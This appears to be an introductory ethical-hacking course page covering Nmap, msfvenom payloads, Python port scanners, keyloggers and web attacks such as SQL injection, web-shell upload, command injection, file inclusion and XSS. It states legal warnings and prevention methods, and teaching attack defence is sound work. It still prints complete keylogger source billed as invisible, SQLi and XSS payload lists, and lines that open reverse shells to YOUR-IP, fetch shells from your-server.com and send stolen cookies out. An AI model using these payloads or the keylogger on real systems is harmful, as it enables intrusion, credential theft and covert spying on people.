Introduction
What is Ethical Hacking?

Ethical hacking — also called penetration testing — is the practice of intentionally trying to break into a computer system, network, or application with permission, in order to find weaknesses before malicious hackers do.

Think of it like hiring a locksmith to try to break into your own house — so you can see where your security is weak.

😈
Black Hat
Malicious hacker. Breaks in without permission. Illegal.
🤍
White Hat
Ethical hacker. Has permission. Helps fix vulnerabilities.
🩶
Grey Hat
Hacks without permission but reports findings. Gray area.
💼
Pen Tester
Professional ethical hacker hired by companies.

⚖️ Ethics & The Law — Very Important

Golden Rule: Never scan, attack, or access any system, network, or device that you do not own or do not have explicit written permission to test. Even scanning someone's network without permission can be illegal.
Authorisation
Written permission from the owner of a system to test it. Always get this first.
Scope
The agreed boundaries of what you're allowed to test. Stay within scope at all times.
Responsible Disclosure
If you find a real vulnerability, report it to the owner — don't exploit it.

The Hacking Process
The 5 Phases of Ethical Hacking

Every professional penetration test follows these stages:

1
Reconnaissance — Gather information about the target (domain names, IPs, employee names, open ports). Passive or active.
2
Scanning & Enumeration — Use tools to map the network, find open ports, running services, and OS versions.
3
Gaining Access — Exploit discovered vulnerabilities to get into the system.
4
Maintaining Access — See if you can stay inside without being detected (simulates real attackers).
5
Reporting — Document everything found and give recommendations to fix the issues.

Nmap
🗺️ Scanning with Nmap

Nmap (Network Mapper) is the most famous tool for discovering what's on a network. It shows you which devices are online and what services they're running.

We will only scan our own VM network — never external or real networks without permission.

nmap commands
# Find your own IP address first
ip addr

# Scan your local network for live devices
nmap 192.168.1.0/24

# Detailed scan of a specific IP (shows open ports)
nmap -sV 192.168.1.1

# Fast scan — most common 100 ports
nmap -F 192.168.1.1

# Operating system detection
nmap -O 192.168.1.1

# All-in-one scan (version, OS, scripts)
nmap -A 192.168.1.1
⚠️
Only scan 192.168.x.x addresses (your local network) during practice. Never run Nmap against websites, servers, or networks you don't own.

Attack Types
🎭 What is a Client-Side Attack?

So far we've looked at scanning and recon. Now let's talk about how attackers actually get into a system. One of the most common methods is a client-side attack.

A client-side attack targets the user rather than the server. Instead of hacking a firewall or a server directly, the attacker tricks the victim into running a malicious file or clicking a bad link — the victim's own computer does the work.

📧
Phishing Email
Victim gets an email with a fake link or attachment that runs malware.
📁
Malicious File
A file (.exe, .pdf, .docx) that looks normal but runs a payload when opened.
🌐
Fake Website
A copied website that installs malware when the victim visits it.
💾
USB Drop Attack
A USB stick left in a parking lot — curious person plugs it in and gets hacked.
🚨
Educational purpose only. In this class we perform all demonstrations on our own virtual machines. Never attempt this on any real person's device without written permission.
Backdoors
🚪 What is a Backdoor?

A backdoor is a hidden program secretly installed on a target computer that gives an attacker remote control of that machine over the internet or a network — without the victim knowing.

Think of it like secretly making a copy of someone's house key and hiding it under the mat. The owner doesn't know you have it, but you can enter anytime.

🖥️
Remote Desktop
See and control the victim's screen live in real time.
📷
Webcam Access
Activate the victim's webcam without them knowing.
⌨️
Keylogger
Record every key the victim types — passwords, messages, everything.
📂
File Access
Browse, upload, download or delete files on the victim's computer.
💡
Inside every backdoor is a piece of code called a payload. The payload is what actually gives the attacker remote access and the ability to execute commands on the target machine.
Payloads
💣 What is a Payload?

A payload is the core code inside a backdoor or exploit that carries out the actual attack. When a victim runs an infected file, the payload executes silently in the background and connects back to the attacker's machine.

There are two main types of payloads:

Staged Payload
A small initial payload (stager) that runs first and then downloads the rest of the payload from the attacker's machine. Smaller file size. Example: windows/meterpreter/reverse_tcp
Stageless Payload
The entire payload is packed into one file — no need to download anything extra. Bigger file but works without an active connection during delivery.
Reverse Shell / Reverse TCP
The victim's machine connects back to the attacker — this bypasses most firewalls because outgoing connections are usually allowed.
Meterpreter
A very powerful payload from the Metasploit framework. Runs entirely in memory (no files written to disk), giving webcam, keylogger, shell access and more.
msfvenom
⚗️ What is msfvenom?

msfvenom is a Kali Linux tool from the Metasploit Framework. It lets you create custom payloads — you choose the target OS, the type of connection, your IP address, a port, and the file format. msfvenom packages it all into a single file (e.g. a .exe) that you can use in a client-side attack.

It replaced the older msfpayload and msfencode tools and combines both into one command.

🎯
Choose Target
Windows, Linux, Android, macOS — pick the victim OS.
📡
Set Your IP
LHOST = your Kali IP. The payload calls back to you.
🔌
Set Port
LPORT = the port you'll listen on (e.g. 8080).
📄
Choose Format
Output as .exe, .apk, .py, .php and many more.

Now we create the payload using msfvenom. We package it as a .exe file — when a Windows victim runs this file, it connects back to our Kali machine and gives us full control.

LPORT=8080

-f exe

-o hey.exe

🔍 Bonus Project 1 · Python Port Scanner
🌐 Bonus: Build a Python Port & Vulnerability Scanner

A port scanner discovers which network ports are open on a target machine. Open ports reveal running services — web server, SSH, FTP, database — and each is a potential entry point for an attacker. Tools like Nmap do this — here we build our own in Python so you understand exactly what happens at the network level.

🔌
What is a Port?
A virtual door (numbers 0–65535). Each service listens on a specific port number.
🚪
Open Port
A service is actively listening and accepting connections here.
🔒
Closed Port
No service listening — connection refused immediately.
🧱
Filtered Port
Firewall blocking — no response, connection times out.
Port Scanner · Common Ports
📋 Common Ports & Their Risk Levels
Port 21 — FTP
File Transfer. Often has weak passwords. Credentials sent unencrypted.
Port 22 — SSH
Secure remote terminal. Open SSH = can attempt brute-force login.
Port 23 — Telnet ⚠️
Unencrypted remote login. Everything including passwords sent in plain text. Never use.
Port 80 — HTTP
Unencrypted web server. Traffic can be intercepted with a MITM attack.
Port 445 — SMB ⚠️
Windows file sharing. Exploited by WannaCry/EternalBlue ransomware. Should NEVER be internet-facing.
Port 3306 — MySQL ⚠️
Database. If open to the internet — catastrophic misconfiguration. Databases must never be public.
Port 3389 — RDP ⚠️
Windows Remote Desktop. Commonly brute-forced. Major attack vector.
Port Scanner · Simple Version
📝 Simple Port Scanner Code

No extra libraries needed — just Python's built-in socket module.

python — port_scanner.py
# Simple Port Scanner — TechCamp Bonus
# Only scan your OWN machine or with permission!

import socket
from datetime import datetime

def scan_port(ip, port, timeout=0.5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0  # 0 = connected = OPEN
    except:
        return False

def scan_range(ip, start, end):
    print(f"\n🔍 Scanning {ip} — Ports {start}-{end}")
    print(f"Started: {datetime.now().strftime('%H:%M:%S')}")
    print("-" * 35)
    open_ports = []
    for port in range(start, end + 1):
        if scan_port(ip, port):
            open_ports.append(port)
            print(f"  ✅ Port {port:5} — OPEN")
    print("-" * 35)
    print(f"Found {len(open_ports)} open port(s)")

# Scan your own machine safely
scan_range("127.0.0.1", 1, 1024)
connect_ex((ip, port))
Attempts TCP connection. Returns 0 if open, non-zero if closed/filtered.
settimeout(0.5)
Wait max 0.5s per port. Lower = faster scans but may miss filtered ports.
127.0.0.1
Localhost — your own machine. Always safe to scan.
Port Scanner · Advanced Version
🔍 Advanced Scanner — Service + Vulnerability Detection

This version identifies the service on each port, grabs service banners, and flags high-risk ports automatically.

python — advanced_scanner.py
import socket
from datetime import datetime

SERVICES = {
    21:"FTP", 22:"SSH", 23:"Telnet ⚠",
    25:"SMTP", 53:"DNS", 80:"HTTP",
    443:"HTTPS", 445:"SMB ⚠",
    3306:"MySQL ⚠", 3389:"RDP ⚠",
    5900:"VNC ⚠", 8080:"HTTP-Alt"
}
HIGH_RISK = [21, 23, 135, 139, 445, 3306, 3389, 5900]

def grab_banner(ip, port):
    try:
        s = socket.socket(); s.settimeout(1)
        s.connect((ip, port))
        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        s.close(); return banner[:70]
    except: return None

def scan(ip, ports):
    print(f"\n🔍 Scanning: {ip}  ({datetime.now().strftime('%H:%M:%S')})\n")
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
                svc = SERVICES.get(port, "Unknown")
                risk = " ← HIGH RISK" if port in HIGH_RISK else ""
                print(f"  ✅ {port:5} {svc}{risk}")
                banner = grab_banner(ip, port)
                if banner: print(f"       └ {banner}")
            s.close()
        except: pass

    risky = [p for p in open_ports if p in HIGH_RISK]
    print(f"\n📊 {len(open_ports)} open  |  {len(risky)} high-risk")
    if risky:
        print(f"⚠️  High-risk ports open: {risky}")
        print("   → Firewall or close these immediately!")

scan("127.0.0.1", list(SERVICES.keys()))
SERVICES dict
Maps port → service name so results are human-readable.
grab_banner()
Reads first bytes from open port — services often announce their version here (e.g. "SSH-2.0-OpenSSH").
HIGH_RISK list
Ports that should never be open publicly — FTP, Telnet, SMB, RDP, MySQL, VNC.
⚠️
Legal reminder: Only scan 127.0.0.1 (your machine) or your own VM. Scanning any external IP without explicit written permission is illegal worldwide. Stay in your lab!

Bonus · Version 1
⌨️ Simple Keylogger — No GUI

The simplest version — runs silently in the background, logs every key to a text file. No window, no buttons — completely invisible.

python — keylogger_simple.py
from pynput import keyboard

log_file = "keylogs.txt"

def on_press(key):
    try:
        # Regular character key (a, b, c, 1, 2 ...)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special key (Enter, Space, Backspace, Shift ...)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listening — runs until manually stopped
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# View captured keystrokes in terminal:
cat keylogs.txt
on_press(key)
Called automatically every time a key is pressed. The key object holds what was pressed.
key.char
The character value of a normal key (e.g. 'a', '5'). Raises AttributeError for special keys.
except AttributeError
Catches special keys like [Enter], [shift], [ctrl] and logs them with brackets around them.
keyboard.Listener
Starts a background thread that listens for keyboard events and calls on_press for each.
Bonus · Version 2
🖥️ Professional Keylogger — With GUI

A more advanced version with a tkinter window showing the logger is active, a quit button, and timestamps for every keystroke so you know exactly when each key was pressed.

python — keylogger_gui.py
from pynput import keyboard
import tkinter as tk
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        entry = f"{timestamp} - {key.char}\n"
    except AttributeError:
        entry = f"{timestamp} - [{key}]\n"
    with open(log_file, "a") as f:
        f.write(entry)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def build_gui():
    window = tk.Tk()
    window.title("Keylogger")
    window.geometry("300x150")

    label = tk.Label(window, text="Keylogger Running...",
                     font=("Arial", 12))
    label.pack(pady=20)

    log_label = tk.Label(window, text=f"Saving to: {log_file}",
                         font=("Arial", 9), fg="grey")
    log_label.pack()

    btn = tk.Button(window, text="Quit", command=window.destroy,
                    bg="red", fg="white", font=("Arial", 10))
    btn.pack(pady=10)

    start_keylogger()
    window.mainloop()

build_gui()

How the Web Works
🌐 How Websites Actually Work

Before you can hack a website, you need to understand how the web works at a deeper level. Every time you open a browser and visit a site, a complex chain of events happens in milliseconds — most people never see it.

There are three main players: the Web Browser, the Web Server, and the Database.

The Full Web Request Flow
[ You ] type https://techcamp.live in browser ↓ [ DNS Server ] translates techcamp.live → 185.199.108.153 (IP) ↓ HTTP/HTTPS request [ Web Server ] receives request, processes it ↓ if data needed [ Database ] SQL query → returns data (users, posts, products...) ↓ response [ Web Server ] builds HTML page and sends it back ↓ [ Your Browser ] renders HTML/CSS/JS → you see the webpage
Web Browsers
🖥️ What is a Web Browser?

A web browser (Chrome, Firefox, Edge, Safari) is a program that sends requests to web servers and renders the responses. It's not just a window — it's a full application that interprets three languages:

🏗️
HTML
HyperText Markup Language. The structure of the page — headings, buttons, forms, links, images.
🎨
CSS
Cascading Style Sheets. The looks — colours, fonts, layout, animations.
⚡
JavaScript
The behaviour — makes pages interactive, handles clicks, validates forms, fetches data.
🍪
Cookies & Sessions
Small files stored in your browser that keep you logged in. A major hacking target.
URL (Uniform Resource Locator)
The address of a web page. Format: https://site.com/page?param=value — every part matters to a hacker.
HTTP vs HTTPS
HTTP sends data in plain text — anyone can intercept it. HTTPS encrypts it with TLS. Always look for the padlock 🔒 when entering passwords.
Developer Tools
Press F12 in any browser. You can see all HTML, CSS, JavaScript, network requests, cookies, and storage. A hacker's first tool — and it's built in!
Web Servers
🖥️ What is a Web Server?

A web server is software running on a computer that listens for incoming HTTP/HTTPS requests and responds with web pages, files or data. It's the engine behind every website. The computer running it is also called a server.

Apache
The most popular web server in the world. Free and open source. Runs on Linux. Powers ~30% of all websites. Config files can be misconfigured — a common vulnerability.
Nginx (Engine-X)
Fast, lightweight web server. Great for high traffic. Also used as a reverse proxy. Very common on modern websites.
IIS (Internet Information Services)
Microsoft's web server. Runs on Windows Server. Common in corporate environments. Has had many vulnerabilities over the years.
What runs behind it
PHP, Python (Django/Flask), Node.js, Ruby on Rails — these are programming languages that generate dynamic content. The server runs them and sends back HTML.
🔍
When doing recon on a target, finding out what web server they use (Apache, Nginx, IIS) tells you which vulnerabilities to look up. Use Wappalyzer browser extension or whatweb in Kali to fingerprint a website's technology stack.
Databases
🗄️ Databases — Where All the Data Lives

Almost every website has a database behind it — storing users, passwords, products, posts, orders, messages. The web server queries the database using SQL (Structured Query Language) to get and store data.

This is exactly why databases are the #1 target for hackers — they contain everything valuable.

🐬
MySQL / MariaDB
Most common. Used by WordPress, Facebook (early), many PHP sites. Port 3306.
🐘
PostgreSQL
Advanced, powerful. Used by many modern apps. Port 5432.
🪶
SQLite
Lightweight, file-based. Used in mobile apps and small websites. No server needed.
🏢
Microsoft SQL Server
Corporate Windows environments. Port 1433. Common SQLi target.
-- A basic SQL query — this is what a web server sends to the database
SELECT * FROM users WHERE username = 'kwame' AND password = 'mypassword';

-- If both match, the database returns the user row → you're logged in
-- If nothing matches → login fails
-- This query is WHERE SQL injection attacks happen
HTTP Requests
📨 HTTP Requests & Responses — What's Really Sent

When your browser visits a page or submits a form, it sends an HTTP request. Understanding this is essential for web hacking because all attacks — SQL injection, XSS, CSRF — happen by manipulating these requests.

── GET REQUEST ─────────────────────────────────────────────────
When you visit a page:
GET /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123

── POST REQUEST ────────────────────────────────────────────────
When you submit a login form:
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=kwame&password=mypassword123

── SERVER RESPONSE ─────────────────────────────────────────────
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly

<html>Welcome, Kwame!</html>

── COMMON HTTP STATUS CODES ─────────────────────────────────────
200 OK          → Success
301 Redirect    → Page moved permanently
403 Forbidden   → You don't have permission
404 Not Found   → Page doesn't exist
500 Server Error → Something broke on the server (interesting!)
🔧
Use Burp Suite in Kali to intercept and modify HTTP requests before they reach the server. This is how you test for vulnerabilities — change a parameter, see what happens. We cover Burp Suite in advanced sessions.
SQL Injection
💉 What is SQL Injection?

SQL Injection (SQLi) is one of the oldest, most dangerous, and most common web vulnerabilities. It happens when a web application takes user input and inserts it directly into a SQL query without sanitising it. The attacker injects their own SQL code into the query, changing what it does.

SQL injection has been used to steal millions of user records from major companies including Yahoo, Adobe, LinkedIn, and many banks.

🚨
Educational only. SQL injection on any website you don't own is illegal. We demonstrate this on intentionally vulnerable practice apps (DVWA, SQLi-Labs) only.
💾
Data Theft
Dump entire databases — usernames, passwords, emails, credit cards.
🔑
Auth Bypass
Log in as any user — including admin — without knowing the password.
🗑️
Data Destruction
DROP TABLE — delete entire databases. Irreversible if no backup.
🚪
OS Access
In some configs, SQLi can lead to reading system files or even executing OS commands.
SQL Injection Explained
🔍 How SQL Injection Works — Step by Step

Let's walk through a real login bypass attack:

── NORMAL LOGIN ────────────────────────────────────────────────
User types: username = "kwame"  password = "secret123"

Server builds this SQL query:
SELECT * FROM users
WHERE username = 'kwame'
AND  password  = 'secret123';
→ Returns the user row → Login succeeds ✅

── SQL INJECTION ATTACK ─────────────────────────────────────────
Attacker types in the username field:
' OR '1'='1' -- 
And any password (it won't matter)

Server builds this SQL query:
SELECT * FROM users
WHERE username = '' OR '1'='1' -- ' AND password = 'anything';

The -- makes everything after it a COMMENT → ignored
'1'='1' is ALWAYS true → condition always passes
→ Returns ALL users → Logged in as the FIRST user (often admin!) ✅
' (single quote)
The classic injection character. It closes the string in the SQL query, letting the attacker write their own SQL after it.
-- (double dash)
SQL comment character. Everything after -- is ignored by the database. Used to remove the rest of the original query.
OR 1=1
A condition that is always true. Makes the WHERE clause match every row in the table.
SQL Injection Types
🧬 Types of SQL Injection
Classic / In-Band SQLi
The most common type. The result of the injected query is shown directly on the page. Easiest to exploit and detect. Example: error messages showing database info, or data appearing in the page.
Blind SQLi
The database doesn't return data in the response — you can't see the result directly. Instead you ask True/False questions: "Does the username start with A?" and observe the app's behaviour. Slower but very powerful.
Time-Based Blind SQLi
Uses the SLEEP() function. If the app pauses for 5 seconds, the condition was true. '; IF(1=1) SLEEP(5)-- Works even when the app gives no visible response difference.
UNION-Based SQLi
Uses the UNION SQL command to append a second SELECT query and retrieve data from other tables. Used to dump usernames, passwords and any other table in the database.
Error-Based SQLi
Intentionally triggers a database error that reveals information in the error message — table names, column names, database version. Many poorly configured servers show these errors publicly.
SQLi Payloads
💉 Common SQL Injection Payloads

These are payloads used on intentionally vulnerable practice apps like DVWA and SQLi-Labs:

── BASIC TEST — check if field is vulnerable ──────────────────
'                   ← single quote — causes error if vulnerable
''                  ← double quote — tests string handling
1' --               ← close string, comment rest

── AUTH BYPASS ───────────────────────────────────────────────
' OR '1'='1         ← classic bypass in username field
' OR '1'='1' --    ← with comment to kill password check
admin'--            ← log in as admin with no password
' OR 1=1--         ← numeric version

── UNION INJECTION — dump data ───────────────────────────────
' UNION SELECT 1,2,3--               ← find number of columns
' UNION SELECT user(),database()--    ← get db user and name
' UNION SELECT table_name,2 FROM information_schema.tables--
↑ list all table names in the database

── TIME-BASED BLIND ──────────────────────────────────────────
' OR SLEEP(5)--     ← if page pauses 5 seconds = vulnerable

── COMMENT VARIATIONS ────────────────────────────────────────
-- -     MySQL comment
#         MySQL comment  
/**/      inline comment (good for bypassing WAFs)
sqlmap
🤖 sqlmap — Automated SQLi Tool in Kali

sqlmap is a powerful open-source tool in Kali Linux that automatically detects and exploits SQL injection vulnerabilities. It can dump entire databases, crack password hashes, and even get a shell on the server — all automated.

# Basic test — is this URL vulnerable?
sqlmap -u "http://target.com/page.php?id=1"

# Get list of databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables in a specific database
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# Dump the users table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

# Test a POST login form
sqlmap -u "http://target.com/login.php" \
       --data="username=test&password=test" \
       --level=3 --risk=2

# Practice on the legal target (NOT real sites):
# http://testphp.vulnweb.com — legal practice site
⚠️
Only run sqlmap on deliberately vulnerable practice sites like DVWA, SQLi-Labs, or testphp.vulnweb.com. Running it on any real site without explicit permission is illegal and leaves logs that can trace back to you.
Prevention
🛡️ How to Prevent SQL Injection

Understanding attacks makes you a better defender. Here's how developers prevent SQLi:

1
Prepared Statements / Parameterised Queries — the #1 fix. The SQL query and the user data are sent to the database separately. The database never interprets user input as SQL code. Use this ALWAYS.
2
Input Validation — validate and sanitise all user inputs. If a field expects a number, reject anything that isn't a number. Whitelist acceptable characters.
3
Least Privilege — the database user the app connects with should only have SELECT/INSERT on the tables it needs. Never connect as root. Limits damage if SQLi occurs.
4
WAF (Web Application Firewall) — filters and blocks suspicious requests before they reach the app. Not a silver bullet but adds a layer of protection.
5
Hide error messages — never show raw database errors to users. Log them server-side but return a generic "something went wrong" to the browser.
// ❌ VULNERABLE — never do this
$query = "SELECT * FROM users WHERE name = '" . $_GET['name'] . "'";

// ✅ SAFE — parameterised query (PHP PDO example)
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$_GET['name']]);
// User input is NEVER inserted directly into the SQL string
Other Web Vulnerabilities
🌐 Other Web Attacks to Know
XSS — Cross-Site Scripting
Injecting malicious JavaScript into a web page that runs in other users' browsers. Used to steal cookies (and therefore session tokens), redirect users, or deface websites. Test with: <script>alert('XSS')</script>
CSRF — Cross-Site Request Forgery
Tricks a logged-in user's browser into making a request they didn't intend — like transferring money or changing their password. The server can't tell the request didn't come from the user.
Directory Traversal
Using ../../../etc/passwd in a URL parameter to navigate up the folder structure and read files outside the web root. Can expose server configuration files.
IDOR — Insecure Direct Object Reference
Changing a number in a URL to access another user's data. e.g. /profile?id=1001 → change to /profile?id=1002 and see someone else's profile. Very common bug.
File Upload Vulnerabilities
Uploading a PHP shell disguised as an image. If the server executes it, the attacker has Remote Code Execution (RCE). Always validate file type server-side, never trust the extension alone.
Information Gathering
🔍 Web Recon — Information Gathering

Before attacking a website, a professional penetration tester collects as much information as possible. This phase is called reconnaissance. The more you know about the target, the more attack vectors you can find.

There are three ways to attack a website: attack the web application itself, attack the server OS or software, or attack the humans managing it (social engineering).

What to gather
IP address · domain owner info · technologies used (PHP, WordPress, Apache...) · other sites on the same server · DNS records · unlisted files, subdomains and hidden directories
Why it matters
Every piece of info narrows down what vulnerabilities to test. Knowing they use WordPress 5.2 means you search for WordPress 5.2 exploits. Knowing the server is Apache 2.4.49 means you check if EternalBlue applies.
Recon Tools
🛠️ Information Gathering Tools

These are the tools a web penetration tester uses in the recon phase — all free, most already in Kali:

1
Whois Lookup — finds who owns the domain, when it was registered, the registrar, contact info. Sometimes reveals the owner's real name and address if they didn't pay for privacy protection.
→ whois.domaintools.com
2
Netcraft Site Report — shows the web server type (Apache/Nginx/IIS), operating system, hosting provider, and site history. Tells you exactly what technology stack the target is running.
→ toolbar.netcraft.com/site_report?url=TARGET
3
Robtex DNS Lookup — comprehensive DNS analysis. Shows all DNS records, mail servers, nameservers, and all other websites hosted on the same IP. Very powerful for finding weak links on shared hosting.
→ robtex.com
4
Wappalyzer — browser extension that fingerprints every technology a site uses in real time. JavaScript frameworks, CMS, analytics, CDN, server software — all revealed instantly as you browse.
Subdomains & Directories
📂 Finding Subdomains & Hidden Files

Subdomains like beta.facebook.com or admin.target.com often run older, less secure software or have weaker configurations than the main site. Finding them expands your attack surface significantly.

Hidden directories and files like /admin/, /backup/, or config.php.bak are often left by developers and contain credentials, source code or admin panels.

── SUBDOMAIN ENUMERATION using Knock ─────────────────────────
# Download Knock from GitHub
git clone https://github.com/guelfoweb/knock.git
# Navigate to it
cd knock
# Run against target
python3 knockpy.py target.com
# Returns all subdomains it can find by brute-forcing common names

── DIRECTORY & FILE BRUTE FORCE using dirb ───────────────────
# dirb is already installed in Kali
dirb http://target.com
# With a custom wordlist:
dirb http://target.com /usr/share/wordlists/dirb/big.txt
# dirb tries every word in the list as a URL path
# If the server returns 200 OK → that file/folder exists!
# Common finds: /admin/, /login.php, /backup/, /config/

── FIND OTHER SITES ON THE SAME SERVER ───────────────────────
# Method 1: Robtex → "names pointing to same IP" section
# Method 2: Bing search
# In Bing search bar type:
ip: 185.199.108.153
# Returns all websites Bing knows about on that IP
# If one site on shared hosting is vulnerable, others may be too
💡
Why other sites on the same server matter: On shared hosting, one server runs dozens of websites. If you hack one of them, you may be able to access files from the others. This is called a cross-site attack — it's why security-conscious companies use dedicated servers.
File Upload Vulnerabilities
📁 File Upload Vulnerabilities

File upload vulnerabilities are among the simplest and most dangerous. They occur when a web application lets users upload files but doesn't properly validate what type of file is being uploaded. If an attacker can upload a PHP file, the server will execute it — giving them full control.

The Attack
Upload a PHP web shell disguised as an image. The server doesn't check properly, stores it, and when you visit the uploaded file's URL — the server executes your PHP code instead of serving a picture.
What a Web Shell Does
A web shell is a PHP script that lets you run OS commands on the server through your browser. Full access to the file system, ability to download/upload files, read passwords, pivot to other machines.
── Using Weevely — PHP backdoor generator in Kali ────────────

# Step 1: Generate a PHP backdoor file
weevely generate MyPassword123 backdoor.php
# Creates backdoor.php — this is the file you'll upload

# Step 2: Upload backdoor.php through the vulnerable upload form
# Find the URL where uploaded files are stored, e.g.:
# http://target.com/uploads/backdoor.php

# Step 3: Connect to your uploaded shell
weevely http://target.com/uploads/backdoor.php MyPassword123
# You now have a shell on the server!

# Step 4: Explore what you can do
help
# Shows all available Weevely commands:
# file_read, file_upload, file_download, shell_sh, etc.

# ── BYPASSING BASIC FILTERS ──────────────────────────────────
# If server checks file extension only:
# Rename to: backdoor.php.jpg  or  backdoor.pHp
# If server checks MIME type — change it in Burp Suite
# Many filters only check the filename, not the actual content
🚨
Practice this ONLY on DVWA locally. Uploading shells to any real website is illegal and constitutes unauthorised access — a serious criminal offence.
Code Execution
⚙️ Code Execution Vulnerabilities

Code execution vulnerabilities allow an attacker to run operating system commands directly on the web server — as if they had a terminal. This is the most severe type of web vulnerability because it gives direct access to the server's OS, not just the web application.

How it happens
A developer uses dangerous functions like PHP's exec(), system(), or shell_exec() and passes user input directly into them without sanitising. The attacker appends their own commands using ; or &&.
What you can do
Run any Linux or Windows command on the server. Read /etc/passwd, list directories, download files with wget, create backdoors, add users, get a reverse shell back to your machine.
── Example vulnerable URL ────────────────────────────────────
# App does: system("ping " . $_GET['ip'])
# Normal use:
http://target.com/ping.php?ip=8.8.8.8
# Attack — append commands with semicolons:
http://target.com/ping.php?ip=8.8.8.8; cat /etc/passwd
http://target.com/ping.php?ip=8.8.8.8; ls -la /var/www/html
http://target.com/ping.php?ip=8.8.8.8; whoami

── Get a Reverse Shell ───────────────────────────────────────
# Step 1: Set up listener on your Kali machine
nc -lvnp 4444
# Step 2: Inject via code execution to connect back
ip=8.8.8.8; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
# Step 3: You get a live terminal on the server!

── Download files onto target server ─────────────────────────
# Use wget to pull your backdoor onto the server:
ip=8.8.8.8; wget http://your-server.com/shell.php -O /var/www/html/shell.php
File Inclusion
📂 LFI & RFI — File Inclusion Vulnerabilities

Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when a web application includes files based on user input without proper validation. Think of it as the server being tricked into opening a file it shouldn't.

LFI — Local File Inclusion
Read any file on the server — even outside the web root. Target sensitive files like /etc/passwd (usernames), /etc/shadow (password hashes), or application config files with database credentials.
RFI — Remote File Inclusion
More powerful than LFI. Execute PHP files hosted on YOUR server on the TARGET server. Store your malicious PHP as a .txt file on a server you control, include it remotely — it runs on the victim's machine.
── LFI — Local File Inclusion ────────────────────────────────
# Vulnerable URL pattern:
http://target.com/page.php?file=contact.html
# Attack — traverse up and read system files:
http://target.com/page.php?file=../../../etc/passwd
http://target.com/page.php?file=../../../etc/shadow
http://target.com/page.php?file=../../../var/www/html/config.php
# Each ../ goes up one directory level
# Count how many folders deep you are and go above web root

── RFI — Remote File Inclusion ───────────────────────────────
# Host a PHP backdoor on your server as .txt (bypasses filter)
# Example: http://your-server.com/shell.txt contains PHP code
# Inject it into the vulnerable URL:
http://target.com/page.php?file=http://your-server.com/shell.txt
# The target server downloads and EXECUTES your PHP code!
# You now have Remote Code Execution (RCE)

── PREVENTION ────────────────────────────────────────────────
# In php.ini — disable remote includes:
allow_url_fopen  = Off
allow_url_include = Off
# Use static includes only — never let user input determine the filename
# Validate and whitelist allowed filenames
XSS Deep Dive
🔀 XSS — Cross Site Scripting (Full Breakdown)

XSS allows an attacker to inject JavaScript code into a webpage that runs in other users' browsers — not on the server. The server is unaware. The attack targets the users of the website, not the website itself.

1. Stored XSS (Persistent)
The malicious script is saved in the database and served to everyone who visits that page. Most dangerous type. Example: inject a script into a comment field — every visitor who loads the comments page runs your code. Lasts until removed from the database.
2. Reflected XSS (Non-Persistent)
The script is in the URL. Only affects users who click the specially crafted link. Not stored anywhere. Used in phishing attacks — send victim a link that looks normal but executes JS when they open it.
?search=<script>alert('XSS')</script>
3. DOM-Based XSS
The vulnerability is in the client-side JavaScript itself, not the server. The page's own JS takes data from the URL or user input and writes it to the DOM without sanitising. Never touches the server — harder to detect.
── TESTING FOR XSS ──────────────────────────────────────────
# Basic test in any input field or URL parameter:
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>  # steal session cookie
<img src=x onerror=alert('XSS')>          # image tag bypass
<svg onload=alert('XSS')>                  # SVG bypass

── STEAL SESSION COOKIES ─────────────────────────────────────
# If you can steal a victim's session cookie, you can log in as them
<script>
  new Image().src='http://YOUR-IP/steal?c='+document.cookie;
</script>
# Set up a listener on your Kali machine to catch cookies:
# python3 -m http.server 80
# Then check your terminal for incoming requests containing cookies

── BEEF FRAMEWORK ────────────────────────────────────────────
# BeEF (Browser Exploitation Framework) — pre-installed on Kali
# Inject the BeEF hook into a vulnerable XSS field:
<script src="http://YOUR-KALI-IP:3000/hook.js"></script>
# Victim's browser connects to your BeEF panel
# From BeEF you can: steal cookies, redirect browser,
# take screenshots, detect plugins, run social engineering attacks
Preventing XSS
🛡️ Preventing XSS — The Developer's Fix

XSS is prevented by encoding/escaping user input before inserting it into the HTML page. When special characters are escaped, the browser treats them as plain text — not executable code. The browser renders &lt;script&gt; as visible text, not as a script tag.

── HTML ENCODING TABLE ───────────────────────────────────────
Characters that must be escaped before putting in HTML:

  &   →  &amp;     (ampersand)
  <   →  &lt;      (less than — closes HTML tags)
  >   →  &gt;      (greater than)
  "   →  &quot;    (double quote — breaks attributes)
  '   →  &#x27;    (single quote)
  /   →  &#x2F;    (forward slash)

── PHP Example ───────────────────────────────────────────────
// ❌ VULNERABLE — directly outputs user input
echo $_GET['name'];

// ✅ SAFE — escapes HTML special characters
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

── CONTENT SECURITY POLICY (CSP) ─────────────────────────────
# HTTP header that tells browser which scripts are allowed to run
# Even if XSS is injected, CSP can block it from executing
Content-Security-Policy: script-src 'self'
# Only scripts from the same domain are allowed to run

ZAP Scanner
⚡ ZAP — Zed Attack Proxy

